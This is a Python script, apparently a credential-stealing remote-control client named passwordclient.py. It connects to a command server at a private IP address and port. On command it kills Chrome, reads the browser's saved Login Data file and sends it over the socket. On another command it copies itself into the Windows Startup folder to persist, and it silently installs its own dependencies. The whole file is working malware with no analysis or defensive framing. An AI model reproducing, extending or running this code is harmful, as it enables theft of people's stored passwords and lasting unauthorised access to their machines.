try:
    import win32crypt
    from os import system
    import shutil
    import socket
    import cv2
    import subprocess
    import os
    import sqlite3
    import pyperclip
    import time
    from pynput.keyboard import Key,Controller
    from pathlib import PureWindowsPath,Path
except ModuleNotFoundError:
    system("pip install pyperclip")
    system("pip install pywin32")
    system("pip install opencv-python")
    system("pip install pynput")
    system("pip install pytest-shutil")


def connectDb():
    dbpath = os.path.expanduser("~")+r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    sendfile(sfile=dbpath)


def sendfile(sfile):
    sfile_open = open(sfile,'rb')
    sfile_data = sfile_open.read(6635520)
    s.send(sfile_data)
    sfile_open.close()


def startup():
    path = os.path.expanduser("~") + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    file_path = path + str(PureWindowsPath("\\passwordclient.py"))
    os.rename('passwordclient.py', file_path)
    s.send("File injected successfully".encode())


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.16",4555))
while True:
    data = s.recv(1024).decode()
    if data == "passwords":
        s.send("[*]Connection made!".encode())
        system("Taskkill /F /IM chrome.exe") # close chrome menu
        connectDb()
    if data == 'startup':
        print("")
        try:
            startup()
        except FileNotFoundError:
            print('')
